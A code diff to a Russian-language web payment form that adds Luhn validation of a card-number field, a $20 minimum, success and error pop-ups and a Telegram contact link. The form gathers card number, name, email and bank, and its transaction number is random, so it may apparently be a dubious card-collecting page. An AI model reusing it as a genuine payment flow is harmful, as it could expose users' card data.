@@ -254,7 +254,7 @@
                                 </div>
                                 
                                 <div class="control-material is-secondary">      
-                                    <input class="material-input" type="number" name='requisites' id='requisites' required>
+                                    <input class="material-input" type="number" name='requisites' id='requisites' onchange="validate()" required>
                                     <span class="material-highlight"></span>
                                     <span class="bar"></span>
                                     <label>Реквизиты</label>
@@ -298,16 +298,67 @@
                                 <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
                                 <script>
 
+function luhnAlgorithm(digits) {
+  let sum = 0;
+
+  for (let i = 0; i < digits.length; i++) {
+    let cardNum = parseInt(digits[i]);
+
+    if ( i % 2 === 0) {
+      cardNum = cardNum * 2;
+
+      if (cardNum > 9) {
+        cardNum = cardNum - 9;
+      }
+    }
+
+    sum += cardNum;
+  }
+
+  return sum % 10 === 0;
+}
+
+function validate() {
+var num = document.getElementById('requisites').value;
+console.log(num);
+
+console.log(luhnAlgorithm(num));
+if(luhnAlgorithm(num) == true) {
+    Swal.fire({
+    icon: 'success',
+    title: 'Карта успешно добавлена!',
+})
+} else {
+    Swal.fire({
+    icon: 'error',
+    title: 'Данные карты некорректны',
+    footer: '<a href="https://t.me/smallcommision">Есть вопросы? Обратитесь к нам</a>'
+})
+}
+}
 
 
 function pay() {
+
     var first = document.getElementById('price').value;
     var second = document.getElementById('bank_name').value;
     var fio = document.getElementById('fio').value;
     var email = document.getElementById('email').value;
     var requisites = document.getElementById('requisites').value;
 
+
     if (first !== '' && second !== '' && fio !== '' && email !== '' && requisites !== '') {
+        if (first < 20) {
+            Swal.fire({
+            icon: 'error',
+            title: 'Что-то пошло не так...',
+            text: 'Платёж можно совершить только от 20$',
+            footer: '<a href="https://t.me/smallcommision">Есть вопросы? Обратитесь к нам</a>'
+})
+
+
+    } else {
+    
     var numberRequest = function() {
         return Math.floor(Math.random() * 99);
     }
@@ -339,8 +390,12 @@ function pay() {
     Swal.fire('Отлично!', 'Осталось нажать "Завершить транзакцию."', 'success')
   }
 })
+}
+
+
 
 } else {
+    
     Swal.fire({
     icon: 'error',
     title: 'Что-то пошло не так...',
@@ -348,7 +403,7 @@ function pay() {
     footer: '<a href="https://t.me/smallcommision">Есть вопросы? Обратитесь к нам</a>'
 })
 
-}
+} 
 
 function finish() {
     if (first !== '' && second !== '' && fio !== '' && email !== '' && requisites !== '') {
